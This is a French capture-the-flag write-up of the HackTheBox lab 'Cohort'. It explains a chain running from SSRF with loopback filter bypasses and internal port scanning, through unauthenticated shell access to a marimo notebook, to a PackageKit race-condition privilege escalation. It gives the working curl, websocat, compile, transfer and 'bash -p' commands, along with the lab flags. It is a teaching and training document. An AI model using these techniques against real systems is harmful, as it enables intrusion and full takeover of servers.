# Writeup — HackTheBox "Cohort" (Easy / Linux)

**IP cible :** 10.129.84.101
**Difficulté :** Easy
**OS :** Ubuntu 24.04 LTS (Noble Numbat)

Ce document retrace, étape par étape, la compromission complète de la machine, avec l'explication de chaque terme technique employé.

---

## 1. Reconnaissance réseau

### Commande

```bash
nmap -Pn -sC -sV --top-ports 1000 10.129.84.101
```

### Explication des options

| Option | Signification |
|---|---|
| `-Pn` | Ne pas faire de ping avant le scan (les hôtes HTB bloquent souvent l'ICMP, donc nmap le considérerait "down" sans ça) |
| `-sC` | Lance les scripts NSE par défaut (bannières, infos supplémentaires) |
| `-sV` | Détection de version des services (ex: `nginx 1.24.0`) |
| `--top-ports 1000` | Scanne uniquement les 1000 ports les plus courants (rapide, mais peut rater des ports "exotiques" comme le 8888 ici — c'est pourquoi ce port n'apparaît jamais dans le nmap) |

### Résultat

- **22/tcp** : SSH (OpenSSH 9.6)
- **80/tcp** : HTTP nginx → redirection vers `https://cohort.htb/`
- **443/tcp** : HTTPS nginx, certificat **wildcard** `*.cohort.htb`

**Point clé pédagogique** : un certificat SSL avec Subject Alternative Name en wildcard (`*.cohort.htb`) est toujours un signal fort qu'il existe des **sous-domaines (vhosts)** non listés publiquement. Il faut toujours noter ce genre d'indice dès la reconnaissance.

---

## 2. Découverte de l'application web

Après ajout de `cohort.htb` dans `/etc/hosts` (obligatoire car ce nom de domaine n'existe pas dans le DNS public — seule la machine HTB "sait" y répondre), on visite le site : une page marketing "Cohort Analytics" avec un lien vers **`/portal.html`** intitulé *Client Insights*.

Cette page contient un formulaire **"Register a report source URL"** qui demande à l'utilisateur de fournir une URL ; le serveur va alors **aller chercher (fetch) cette URL lui-même** pour "valider" qu'elle est joignable.

### Pourquoi c'est un signal d'alarme

Toute fonctionnalité où **le serveur fait une requête HTTP sortante vers une URL fournie par l'utilisateur** est un candidat direct à une faille **SSRF**.

**SSRF = Server-Side Request Forgery.** C'est une vulnérabilité où un attaquant parvient à forcer le serveur à envoyer des requêtes réseau vers des destinations de son choix — notamment vers des adresses internes normalement inaccessibles depuis l'extérieur (`127.0.0.1`, réseau privé, métadonnées cloud, etc.), en se servant du serveur comme d'un proxy involontaire.

Le texte de la page confirmait d'ailleurs deux choses importantes :
- *"For security, internal and loopback addresses are rejected"* → il existe un **filtre anti-SSRF**, donc il faut chercher à le **contourner**.
- *"Validated sources are queued for reconciliation"* → une fonctionnalité métier qui exploite ces URLs plus tard (piste à garder en tête, même si dans ce lab elle n'a pas été utilisée).

---

## 3. Confirmation du SSRF

### Endpoint découvert

Via l'onglet **Network** des DevTools du navigateur (F12), on identifie l'appel réel fait par le formulaire :

```
POST https://cohort.htb/api/validate
Content-Type: application/json

{"url":"...","format":"csv"}
```

### Test de confirmation

On monte un serveur HTTP sur notre machine Kali, à l'IP de notre interface VPN HTB (`tun0`) :

```bash
python3 -m http.server 8000
```

Puis on soumet cette URL au formulaire :

```bash
curl -sk -X POST https://cohort.htb/api/validate \
  -H "Content-Type: application/json" \
  -d '{"url":"http://<IP_TUN0>:8000/test.csv","format":"csv"}'
```

Si une requête arrive sur notre serveur HTTP, le SSRF est confirmé : **le serveur cible a bien exécuté une requête réseau vers une adresse qu'on contrôle.**

**Point pédagogique — pourquoi utiliser `python3 -m http.server` et pas `nc` ?**
`nc -lvnp` (netcat) ouvre juste un socket TCP brut, sans jamais répondre en HTTP valide. Si l'outil qui fait le fetch attend une vraie réponse HTTP (statut, headers, content-type), il va soit planter, soit timeout. Un vrai serveur HTTP (`http.server`) répond correctement et permet de voir la requête aboutir proprement.

---

## 4. Contournement du filtre anti-SSRF (bypass de `127.0.0.1`)

Le filtre bloquait explicitement `127.0.0.1` et `localhost`. On a testé plusieurs **représentations alternatives de la même adresse loopback**, une technique classique en SSRF :

| Forme testée | Résultat | Pourquoi ça marche (ou pas) |
|---|---|---|
| `127.0.0.1` | ❌ Bloqué | Forme canonique, détectée par le filtre |
| `localhost` | ❌ Bloqué | Résolution DNS vers `127.0.0.1`, détectée |
| `[::1]` | ❌ Bloqué | Équivalent IPv6 de loopback, détecté |
| `0.0.0.0` | ✅ Passe | Adresse "toutes interfaces" — sur beaucoup de systèmes, une requête vers `0.0.0.0` est traitée comme vers `127.0.0.1`, mais le filtre ne la reconnaît pas comme telle |
| `127.1` | ✅ Passe | Notation IPv4 raccourcie — les systèmes d'exploitation acceptent `127.1` comme équivalent de `127.0.0.1` (les octets manquants sont complétés par des zéros), mais un simple filtre par chaîne de caractères `"127.0.0.1"` ne la reconnaît pas |
| `0177.0.0.1` | ✅ Passe | Notation **octale** du premier octet (0177 en octal = 127 en décimal) |
| `2130706433` | ✅ Passe | Notation **décimale entière** de l'IP entière (127×256³ + 0×256² + 0×256 + 1 = 2130706433) |

**Point pédagogique clé** : un filtre anti-SSRF qui compare une simple **chaîne de caractères** (`if url contains "127.0.0.1"`) est presque toujours contournable, car une adresse IP peut s'écrire sous de très nombreuses formes équivalentes que le système d'exploitation résout toutes vers la même destination réseau, mais qu'un filtre textuel naïf ne reconnaît pas. La bonne pratique de sécurité est de **résoudre l'adresse puis de comparer l'IP résultante** (et de refaire cette vérification juste avant la connexion réseau, pour éviter aussi les attaques par TOCTOU via DNS rebinding).

---

## 5. Scan de ports internes via le SSRF

Une fois le bypass trouvé (`127.1` choisi pour la suite), on scanne les ports courants du **localhost de la machine cible elle-même** (invisibles depuis l'extérieur) en automatisant les requêtes SSRF :

```bash
for port in 22 80 443 3000 5000 8080 8888 9000 ...; do
  curl -sk -X POST https://cohort.htb/api/validate \
    -H "Content-Type: application/json" \
    -d "{\"url\":\"http://127.1:$port/\",\"format\":\"csv\"}"
done
```

**Comment interpréter les réponses :**
- `"Connection refused"` → port fermé
- `"ok": true` avec du contenu → port ouvert avec un service HTTP
- `405 Method not allowed` → port ouvert, mais le service refuse le GET (ce qui trahit quand même sa présence)

### Résultat

- **Port 5000** : une API interne (`cohort-insights`), qui semble n'accepter que du POST
- **Port 8888** : un notebook **marimo**, protégé par un mot de passe/token

---

## 6. Leak de configuration interne via `/status`

En cherchant des chemins classiques sur le port 80 local (nginx), on tombe sur `http://127.1/status`, qui expose la configuration interne du reverse proxy nginx — **normalement bloqué par une ACL restreignant l'accès à `127.0.0.1` uniquement**.

**Pourquoi cette page est accessible via le SSRF alors qu'elle est bloquée depuis l'extérieur ?**
L'ACL de nginx vérifie l'adresse IP **source** de la requête. Quand c'est le serveur cible lui-même qui fait la requête (via notre SSRF), la requête part bien de `127.0.0.1` du point de vue de nginx — donc l'ACL laisse passer, alors qu'une requête directe depuis Internet aurait une IP source différente et serait rejetée.

Cette page a révélé un sous-domaine caché :

```json
{"name":"notebooks","host":"nb-1be3782a8afd3ad5.cohort.htb","target":"127.0.0.1:8888"}
```

Ce sous-domaine sert de **reverse proxy public** vers le service marimo interne (port 8888) — ce qui signifie qu'on peut désormais s'y connecter **directement depuis notre machine**, en passant par nginx, sans avoir besoin du SSRF pour cette étape.

```bash
echo "10.129.84.101 nb-1be3782a8afd3ad5.cohort.htb" | sudo tee -a /etc/hosts
```

---

## 7. RCE pré-authentification sur marimo — CVE-2026-39987

**Marimo** est un environnement de notebook Python interactif (similaire à Jupyter), conçu pour exécuter du code Python de façon réactive dans le navigateur.

### La faille

Marimo protège son endpoint principal (`/ws`, utilisé pour exécuter le code du notebook) par un token d'authentification. Mais un endpoint annexe, **`/terminal/ws`**, qui fournit un **terminal système interactif complet** (un vrai shell bash), a été ajouté sans jamais recevoir la même vérification d'authentification.

**WebSocket, pour rappel** : un protocole qui établit une connexion bidirectionnelle persistante entre client et serveur (contrairement au HTTP classique où chaque requête est indépendante). C'est ce qui permet à `/terminal/ws` de streamer en direct l'entrée/sortie d'un vrai terminal.

Résultat : n'importe qui pouvant atteindre le réseau où tourne marimo peut ouvrir une connexion WebSocket vers `/terminal/ws` **sans aucune authentification** et obtenir un shell avec les droits de l'utilisateur qui a lancé le processus marimo (souvent root en environnement conteneurisé).

### Exploitation

On utilise un client WebSocket (`websocat` ou un script Python avec la lib `websocket-client`) :

```bash
websocat -k wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws
```

`-k` : ignore la vérification du certificat SSL (auto-signé ici).

On obtient immédiatement un shell `marimo@cohort:~$` sans authentification — RCE confirmé.

---

## 8. Récupération du flag utilisateur

```
cat user.txt
```

→ `c354ab1d988223b297e859f8e7d19ad3`

---

## 9. Reconnaissance pour l'élévation de privilèges

Une fois un accès initial obtenu (ici en tant qu'utilisateur `marimo`, UID 1000), l'étape suivante est toujours de chercher un chemin vers `root`. Quelques classiques :

```bash
id                              # UID/GID actuels
uname -a                        # version du kernel
cat /etc/os-release             # distribution et version
sudo -l                         # commandes sudo autorisées (attention : demande un mdp si non configuré en NOPASSWD, à éviter si on n'a pas le mot de passe, ça bloque le shell)
find / -perm -4000 -type f 2>/dev/null   # binaires SUID
getcap -r / 2>/dev/null         # binaires avec capabilities Linux
dpkg -l | grep <service>        # versions des paquets installés, pour chercher des CVE connues
```

**Binaire SUID, pour rappel** : un exécutable avec le bit `setuid` positionné s'exécute toujours avec les droits de son **propriétaire** (souvent root), quel que soit l'utilisateur qui le lance. C'est une source fréquente de privilege escalation si le binaire permet, d'une façon ou d'une autre, d'exécuter des commandes arbitraires.

**Capabilities Linux, pour rappel** : un mécanisme plus fin que le SUID, qui accorde à un binaire des **privilèges spécifiques** (ex: `cap_net_raw` pour envoyer des paquets réseau bruts) sans lui donner les pleins pouvoirs root. Certaines capabilities mal configurées (comme `cap_setuid` sur un interpréteur) permettent aussi l'escalade.

Dans ce lab, la piste intéressante était :

```
dpkg -l | grep -i packagekit
```
→ `packagekit 1.2.8-2ubuntu1.2`

---

## 10. Élévation de privilèges — CVE-2026-41651 "Pack2TheRoot" (PackageKit TOCTOU)

**PackageKit** est un service système (`packagekitd`, tournant en root) qui fournit une API D-Bus standardisée pour installer/mettre à jour des paquets logiciels, utilisée par de nombreuses distributions Linux.

### La faille — comprendre le TOCTOU

**TOCTOU = Time-Of-Check to Time-Of-Use.** C'est une classe de vulnérabilité où un programme **vérifie** qu'une action est autorisée à un instant T, puis **exécute** cette action à un instant T+1 — et entre les deux, l'état du système a changé, invalidant la vérification initiale sans que le programme ne s'en rende compte. C'est une "course" entre deux opérations (d'où le terme **race condition**).

Dans PackageKit :
1. Le service vérifie via **Polkit** (le service qui gère les autorisations système sous Linux) si l'utilisateur est habilité à lancer une installation.
2. Il stocke des indicateurs ("transaction flags") décrivant la nature de cette transaction.
3. Il exécute ensuite la transaction en se basant sur ces indicateurs.

Le bug : un utilisateur non privilégié peut lancer une transaction en mode **SIMULATE** (simulation, qui ne nécessite pas d'autorisation Polkit complète — ça ne fait "que" vérifier que l'installation serait possible, sans l'exécuter), puis, dans la toute petite fenêtre de temps où cette simulation est encore en cours de traitement, **écraser les indicateurs de la transaction** avec ceux d'une vraie installation. Le service, qui a déjà validé l'autorisation pour la simulation, exécute alors la vraie installation d'un paquet **sans revalider l'autorisation** — avec les droits root.

Le paquet malveillant ainsi installé peut contenir des **scripts de maintenance** (des scripts que les gestionnaires de paquets Debian/Ubuntu exécutent automatiquement à l'installation, par exemple pour configurer le logiciel) — ces scripts s'exécutent en tant que root, ce qui donne l'exécution de code arbitraire root.

### Exploitation pratique

1. **Compilation** : l'exploit public est un programme en C qui utilise `libglib2.0` (la librairie que PackageKit utilise en interne pour ses appels D-Bus) :
   ```bash
   gcc -o exploit CVE-2026-41651.c $(pkg-config --cflags --libs glib-2.0 gio-2.0) -Wall
   ```
   Comme la cible n'avait pas `gcc` installé, on a compilé **sur notre machine Kali** (même architecture x86_64), puis transféré le binaire déjà compilé via un serveur HTTP temporaire.

2. **Transfert** : on sert le binaire depuis Kali (`python3 -m http.server`) et on le télécharge depuis le shell obtenu sur la cible (`wget ... -O exploit`), puis on le rend exécutable (`chmod +x exploit`).

3. **Exécution** : l'exploit automatise la course (lancer la simulation, puis écraser rapidement les flags avec la vraie transaction) jusqu'à obtenir un binaire `bash` avec le bit SUID positionné, appartenant à root.

4. **Résultat observé** :
   ```
   [+] SUCCESS — SUID bash at t+3800ms
   uid=1000(marimo) gid=1000(marimo) euid=0(root) groups=1000(marimo)
   ```

**`euid` vs `uid`, pour rappel** : `uid` est l'identité réelle de l'utilisateur, `euid` (effective UID) est l'identité utilisée pour les vérifications de permissions par le noyau. Un binaire SUID root fait tourner le processus avec `uid=1000` (identité réelle inchangée) mais `euid=0` (droits effectifs de root) — c'est exactement ce qu'on observe ici.

### Stabilisation du shell root

```
/bin/bash -p
```
Le flag `-p` ("privileged") empêche bash de **droper automatiquement les privilèges** au démarrage — un comportement de sécurité par défaut de bash quand il détecte que `euid != uid` (justement pour éviter qu'un script SUID mal écrit ne devienne accidentellement une backdoor root). Sans `-p`, `bash` retomberait à `euid=uid=1000` et on perdrait les droits root obtenus.

---

## 11. Récupération du flag root

```
cat /root/root.txt
```

→ `fafae65116484e5294563f0b68c1424e`

---

## 12. Résumé de la chaîne d'attaque complète

```
SSRF non authentifié dans /api/validate
        │
        ▼
Bypass du filtre anti-loopback (127.1 / octal / décimal / 0.0.0.0)
        │
        ▼
Scan de ports internes via le SSRF → découverte des ports 5000 et 8888
        │
        ▼
Leak de la config nginx via /status (ACL contournée car requête émise
depuis 127.0.0.1 du point de vue du serveur) → sous-domaine caché
nb-XXXX.cohort.htb pointant vers marimo (port 8888)
        │
        ▼
Accès direct au vhost marimo (reverse-proxy public) → RCE pré-auth
via CVE-2026-39987 (/terminal/ws sans authentification)
        │
        ▼
Shell utilisateur "marimo" (UID 1000) → user.txt
        │
        ▼
Reconnaissance : PackageKit 1.2.8 détecté
        │
        ▼
Privilege escalation via CVE-2026-41651 (Pack2TheRoot) — race condition
TOCTOU sur les transaction flags de PackageKit → binaire SUID bash root
        │
        ▼
Shell root → root.txt
```

## 13. Enseignements généraux à retenir

1. **Un certificat wildcard est toujours un indice** de sous-domaines cachés — pense à fuzzer les vhosts.
2. **Toute fonctionnalité "fetch une URL fournie par l'utilisateur"** (validation de webhook, preview de lien, import de fichier distant, etc.) est un candidat SSRF à tester systématiquement.
3. **Les filtres anti-SSRF basés sur une comparaison de chaînes de caractères sont presque toujours contournables** — pense à toutes les représentations alternatives d'une IP (octale, décimale, notation courte, IPv6, `0.0.0.0`).
4. **Un SSRF donnant accès au localhost du serveur cible peut révéler des ACL contournables** (des pages "internes only" qui filtrent par IP source, laquelle devient `127.0.0.1` quand c'est le serveur qui fait la requête pour toi).
5. **Toujours identifier précisément les versions des logiciels rencontrés** (`dpkg -l`, bannières HTTP, etc.) et les croiser avec les bases de CVE publiques — beaucoup de privesc Linux modernes reposent sur des CVE récentes dans des daemons systèmes peu audités (PackageKit, Polkit, snapd...).
6. **Un shell SUID (`euid=0`, `uid≠0`) nécessite `bash -p`** pour ne pas perdre les privilèges au lancement d'un nouveau bash.

---

*Writeup rédigé à des fins pédagogiques dans le cadre d'un lab HackTheBox autorisé.*
